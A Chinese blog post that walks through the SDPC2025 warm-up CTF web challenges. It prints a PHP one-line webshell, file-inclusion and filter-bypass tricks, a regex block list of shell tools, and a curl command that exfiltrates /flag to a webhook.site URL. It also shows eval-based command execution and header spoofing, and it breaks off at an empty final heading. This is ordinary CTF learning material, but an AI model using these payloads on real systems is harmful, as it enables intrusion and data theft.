---
title: SDPC2025热身赛
date: 2025-11-19 17:03:18
tags:
index_img: https://pic1.imgdb.cn/item/692161e33203f7be0020934a.png
categories: CTF
---

# ez_upload

php图片马

上传一张图片然后拦截请求，修改文件后缀名及内容，植入一句话木马

```
<?php @eval($_POST['pass']);?>
```

# rHeEsApDoEnRsSe

根据题目名及页面提示，flag在响应头里面，使用curl命令

```
curl -I http://175.27.251.122:32999/
```

`curl` 是一个功能强大的命令行工具，主要用于在网络上传输数据，支持多种协议（如 HTTP、HTTPS、FTP、SFTP 等），常被用于测试接口、下载文件、发送请求等场景。以下是其核心用法总结：

1. **基本请求**
   - 发送 GET 请求（默认）：`curl [URL]`，如 `curl https://example.com`
   - 发送 POST 请求：`curl -X POST [URL]`，可搭配 `-d` 传递数据，如 `curl -X POST -d "name=test" https://example.com/api`
2. **设置请求头**用 `-H` 指定请求头，如模拟浏览器：`curl -H "User-Agent: Mozilla/5.0" https://example.com`
3. **下载文件**
   - 保存为指定文件名：`curl -o 文件名 [URL]`（如 `curl -o file.zip https://example.com/file.zip`）
   - 自动以远程文件名保存：`curl -O [URL]`（URL 需指向具体文件）
4. **处理认证**
   - 基础认证：`curl -u 用户名:密码 [URL]`
   - 携带 Cookie：`curl -b "cookie1=value1" [URL]`，或保存响应 Cookie 到文件：`curl -c cookies.txt [URL]`
5. **其他常用选项**
   - 显示详细请求过程：`curl -v [URL]`
   - 跟随重定向：`curl -L [URL]`
   - 限制传输速度：`curl --limit-rate 100k [URL]`（如限制为 100KB/s）

# ez_include

首先发现只有一行代码

```php
include($_GET['zpf'])
```

include可以包含文件，如txt文本格式，并把包含的文件当作php代码解析执行。

首先尝试利用`?zpf=/etc/passwd` 读取系统目录，但并没有发现什么有价值的信息。

下面尝试利用`?zpf=php://filter/convert.base64-encode/resource=index.php` 获取源码

经过Base64解码后得到源码如下

```php
<?php
error_reporting(0);
$a=$_GET['zpf'];
if(!isset($a)) {
    echo("include(\$_GET['zpf'])");
}else{
    include($a);
        $a='';
}


$pattern = '/(union|cat|tac|more|less|ls|tree|env|head|tail|nl|sed|awk|grep|strings|od|xxd|curl|wget|nc|netcat|python|perl|ruby|bash|sh|zsh|ksh|tcsh|cmd|powershell)/i';

if (preg_match($pattern, $_GET['yzx'])) {
    die('Dangerous command detected!');
}else{
    system($_GET['yzx']);
}

?>
```

这里我们发现了非常关键的system函数，但程序对yzx进行了正则过滤，所以我们考虑绕过正则过滤，执行命令

这里我使用了转义符号绕过，成功读取了目录拿到了flag

------

#### 常用的伪协议

- php://filter 读取文件源码 （协议可以对打开的数据流进行筛选和过滤,常用于读取文件源码）
- php://input 任意代码执行;这种伪协议用于读取原始的 HTTP POST 数据，可以用于处理上传的文件和表单数据。
- data://text/plain 任意代码执行
- zip:// 配合文件上传开启后门

#### 参考文献

[正则过滤绕过](https://developer.aliyun.com/article/1224913)

[文件包含漏洞](https://blog.csdn.net/lilongsy/article/details/108146107)

# **貌合神离**

md5大杂烩

#### 参考文献

[MD5绕过](https://www.cnblogs.com/Yolololo/p/18161894)

[PHP中MD5和sha1绕过方式总结 - dre0m1 - 博客园](https://www.cnblogs.com/dre0m1/p/16062369.html)

[总结ctf中 MD5 绕过的一些思路_ctf md5绕过-CSDN博客](https://blog.csdn.net/CSDNiamcoming/article/details/108837347)

[CTF中关于md5的一些总结 - Dr0n's blog](https://www.dr0n.top/posts/ad669f62/)

# 空谷无音

首先发现命令执行漏洞，但是没有回显，结合题目描述，考虑用其他方式进行外带

- 重定向到文件

我们可以用流重定向符号来将输出内容重定向到文件中, 在通过浏览器进行下载

```Shell
cmd_here > 1.txt
```

然后就可以通过访问 1.txt 获取到输出内容了

- 通过 `curl` 外带

我们可以通过 https://webhook.site/ 来进行数据外带, 我们可以拿到这样一个链接

```HTTP
https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb
```

此时这个路径下的所有请求都会被记录

于是我们可以通过shell指令:

```shell
curl https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb/`cat /flag | base64`
```

# 应声

```php
<?php
highlight_file(__FILE__);

$Pr0 = $_POST['Pr0'];
$Acc1o = $_GET['Acc1o'];
if($Pr0 === 'Pr0' && $Acc1o === 'Acc1o'){
    eval($_POST['cmd']);
}
}
```

观察代码，发现要求POST Pr0=Pr0,GET Acc1o=Acc1o,然后执行cmd中的代码。

```shell
curl -X POST "http://175.27.251.122:33036/?Acc1o=Acc1o" -d "Pr0=Pr0&cmd=system('cat /flag;');"
```

# 杰艾思不想让你看

首先发现前端无法查看源码，而提示就在源码里面，所以使用burp绕过前端获得源码。

在源码中发现一个文件S3crett.php，打开得到一段代码

```php
 <?php
highlight_file(__FILE__);

function safe_eval($cmd) {
    $pattern = '/flag/i';
    if (preg_match($pattern, $cmd)) {
        return "no hacker!!";
    }
    try {
        eval($cmd);
    } catch (Exception $e) {
        return "error " . $e->getMessage();
    }
}
if ($_POST['cmd'] ?? false) {
    $cmd = $_POST['cmd'];
    $result = safe_eval($cmd);
    echo $result;
}
?> 
```

这里我们发现它对cmd进行了正则过滤，不能出现flag

首先考虑字符串拼接绕过，产生报错。

再尝试使用base64编码绕过`cmd=system(base64_decode("Y2F0IC9mbGFn"));` 成功拿到flag

# 六层妖塔

本题考查HTTP头部伪造技术

- 伪造本地IP：`X-Forwarded-For: 127.0.0.1`
- 伪造页面来源：`Referer: https://服务器要求的合法来源域名/`
- 伪造浏览器：
- 伪造用户身份：`Cookie: User=Acc1oFl4g`
- 伪造代理服务器：`Via: 1.1 123.56.103.169 (Proxy/1.0)`

# ez_sssseria